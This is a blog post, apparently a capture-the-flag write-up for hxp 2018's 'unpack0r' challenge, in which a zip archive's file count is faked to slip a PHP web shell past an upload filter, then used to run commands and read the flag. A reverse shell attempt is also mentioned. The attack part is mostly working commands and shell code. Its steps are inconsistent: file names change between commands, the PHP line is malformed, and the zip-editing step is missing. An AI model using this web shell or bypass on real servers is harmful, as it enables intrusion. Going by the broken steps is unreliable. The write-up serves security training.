---
layout: post
title: unpack0r, h4x0rpsch0rr
category: hxp-2018
---
# Description
I could only play hxpCTF during my downtime at Hushcon, but found the challenges extremely engaging and enjoyable. I've split my posts into the crypto challenges and the web challenges. This post is about the web.

NOTE: This is still being written up, sorry for the delay!

# unpack0r
>unpackbar  
>Connection: http://195.201.136.29:8087/

Upon visiting the page, we're presented with what's presumed to be the page source.

```php
<?php
if (isset($_FILES['zip']) && $_FILES['zip']['size'] < 10*1024 ){
    $d = 'files/' . bin2hex(random_bytes(32));
    mkdir($d) || die('mkdir');
    chdir($d) || die('chdir');

    $zip = new ZipArchive();
    if ($zip->open($_FILES['zip']['tmp_name']) === TRUE) {
        for ($i = 0; $i < $zip->numFiles; $i++) {
            if(preg_match('/^[a-z]+$/', $zip->getNameIndex($i)) !== 1){
                die(':/ security');
            }
        }

        exec('unzip ' . escapeshellarg($_FILES['zip']['tmp_name']));
        echo $d;
    }
}
else {
    highlight_file(__FILE__);
}
```

From the source code, we see that the page supports zip file uploads. I wonder what that looks like - let's test the upload functionality with an empty zip.

```bash
echo 'test' > ota

zip test.zip ota
    adding: ota (stored 0%)

curl http://195.201.136.29:8087 -F zip=@test.zip
    files/70c4ec668530f636ec753edbc69f3013a64caba935ebbcf496c2d84d3fb47761

curl http://195.201.136.29:8087/files/70c4ec668530f636ec753edbc69f3013a64caba935ebbcf496c2d84d3fb47761/ota
    test
```

Incredible! So the contents of the zip file are uploaded to the server and displayed back to us. The attack vector is clear, we need to display either a php pass-through page for bash or a php reverse shell. We'll try both methods below.

From the source, if we are to upload a `.php` file, we must bypass the regex validation. The code performs a regex match for each file in the zip, where it gets the number of files from `$zip->numFiles`. What if we controlled that number? Let's take a hexdump of the following two zips and see if we can notice where this data is stored.

```bash
cp ota ota2

zip test1.zip ota
    adding: ota (stored 0%)

zip test2.zip ota ota2
    adding: ota (stored 0%)

```

```bash
xxd test1.zip
    50 4B 03 04 0A 00 00 00 00 00 7A B3 97 4D C6 35 B9 3B 05
    00 00 00 05 00 00 00 03 00 1C 00 6F 74 61 55 54 09 00 03
    68 7C 20 5C 6A 7C 20 5C 75 78 0B 00 01 04 F5 01 00 00 04
    14 00 00 00 74 65 73 74 0A 50 4B 01 02 1E 03 0A 00 00 00
    00 00 7A B3 97 4D C6 35 B9 3B 05 00 00 00 05 00 00 00 03
    00 18 00 00 00 00 00 01 00 00 00 A4 81 00 00 00 00 6F 74
    61 55 54 05 00 03 68 7C 20 5C 75 78 0B 00 01 04 F5 01 00
    00 04 14 00 00 00 50 4B 05 06 00 00 00 00 01 00 01 00 49
    00 00 00 42 00 00 00 00 00                 ^     ^
                                               |     |
```

```bash
xxd test2.zip
    50 4B 03 04 0A 00 00 00 00 00 7A B3 97 4D C6 35 B9 3B 05
    00 00 00 05 00 00 00 03 00 1C 00 6F 74 61 55 54 09 00 03
    68 7C 20 5C 6E 7C 20 5C 75 78 0B 00 01 04 F5 01 00 00 04
    14 00 00 00 74 65 73 74 0A 50 4B 03 04 0A 00 00 00 00 00
    7B B3 97 4D C6 35 B9 3B 05 00 00 00 05 00 00 00 04 00 1C
    00 6F 74 61 32 55 54 09 00 03 6A 7C 20 5C 6B 7C 20 5C 75
    78 0B 00 01 04 F5 01 00 00 04 14 00 00 00 74 65 73 74 0A
    50 4B 01 02 1E 03 0A 00 00 00 00 00 7A B3 97 4D C6 35 B9
    3B 05 00 00 00 05 00 00 00 03 00 18 00 00 00 00 00 01 00
    00 00 A4 81 00 00 00 00 6F 74 61 55 54 05 00 03 68 7C 20
    5C 75 78 0B 00 01 04 F5 01 00 00 04 14 00 00 00 50 4B 01
    02 1E 03 0A 00 00 00 00 00 7B B3 97 4D C6 35 B9 3B 05 00
    00 00 05 00 00 00 04 00 18 00 00 00 00 00 01 00 00 00 A4
    81 42 00 00 00 6F 74 61 32 55 54 05 00 03 6A 7C 20 5C 75
    78 0B 00 01 04 F5 01 00 00 04 14 00 00 00 50 4B 05 06 00
    00 00 00 02 00 02 00 93 00 00 00 85 00 00 00 00 00
              ^     ^
              |     |
```

Right at the end we notice that two values seem unique to each zip; this value represents the number of files in the archive. So if trick the upload code to think that there's only one file, it won't perform a regex check against out php code! Let's give it a shot.

```bash
echo "<?php if(_GET['chai']){ system(_GET['chai']); } ?>" > sh.php

zip ota.zip ota sh.php
    adding: ota (stored 0%)
    adding: sh.php (deflated 22%)

curl http://195.201.136.29:8087 -F zip=@ota.zip
    files/35b3b565956486899c204c899c799747a0d9ab6584d89bcd7b62db6abcdf267c

curl http://195.201.136.29:8087/files/35b3b565956486899c204c899c799747a0d9ab6584d89bcd7b62db6abcdf267c?chai=ls
    ota
    sh.php
```

Perfect! Now we can go get the flag.

```bash
curl http://195.201.136.29:8087/files/35b3b565956486899c204c899c799747a0d9ab6584d89bcd7b62db6abcdf267c/ota.php\?chai\=ls+/
    bin
    boot
    dev
    etc
    flag_WRLJSth9Xq54q5ZGNv8ppAT9.php
    home
    lib
    lib64
    media
    mnt
    opt
    proc
    root
    run
    sbin
    srv
    sys
    tmp
    usr
    var

curl http://195.201.136.29:8087/files/35b3b565956486899c204c899c799747a0d9ab6584d89bcd7b62db6abcdf267c/bbb.php\?chai\=cat+/flag_WRLJSth9Xq54q5ZGNv8ppAT9.php
    <?php
    'hxp{please_ask_gynvael_for_more_details_on_zips_:>}';
```

Note: We tried a reverse PHP shell (specifically [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell)) and it seems the application won't allow reverse connections (as expexted). See output below.
```bash
curl http://195.201.136.29:8087/files/3075a1f1910f2c423d852b164f57856f37b1bdc3fb5834b7ad0a9614c1495d23/rsh.php\
    WARNING: Failed to daemonise.  This is quite common and not fatal.
    Connection refused (111)
```

# h4x0rpsch0rr
>Finally a use case for those internet tingies!  
>Connection: http://195.201.136.29:8001/

Upon visiting the challenge, we land on an interesting page:

![landing](https://github.com/drtychai/drtychai.github.io/blob/master/assets/img/hxp-2018/h4x0rpsch0rr-landing.png)
